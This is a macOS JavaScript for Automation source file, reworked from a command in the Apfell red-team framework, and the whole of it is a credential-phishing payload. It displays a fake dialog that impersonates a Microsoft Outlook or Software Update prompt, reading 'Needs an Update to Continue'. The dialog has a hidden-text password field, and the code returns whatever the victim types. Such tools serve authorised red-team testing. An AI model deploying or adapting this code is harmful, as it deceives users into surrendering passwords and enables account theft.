//Rework of its-a-feature's work:
// https://github.com/its-a-feature/Apfell/blob/master/apfell-docker/app/payloads/apfell-jxa/commands/prompt/prompt.js

function OutlookUpdatePrompt () {
ObjC.import('Foundation')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

let config = [];
var output = "";
let outlookicon = "/Applications/Microsoft Outlook.app/Contents/Resources/Outlook.icns";
let outlookIconexistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(outlookicon,"")
if (outlookIconexistsCheck == true){
  var icon = outlookicon;
  var title = "Microsoft Outlook Needs an Update to Continue";
  var text = "Microsoft Outlook Needs an Update to Continue";
} else {
    var icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
    var title = "An Application Needs an Update to Continue";
    var text = "An Application Needs an Update to Continue";}

	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}

		var prompt = currentApp.displayDialog(text, {
			defaultAnswer: "",
			buttons: ['OK', 'Cancel'],
			defaultButton: 'OK',
			cancelButton: 'Cancel',
			withTitle: title,
			withIcon: Path(icon),
			hiddenAnswer: true
    });
   
    var promptResults = prompt.textReturned
    output += "**************************************\n" + "**** Contents of the Prompt Entry ****\n" + "**************************************\n" + promptResults + "\n"
return output
}
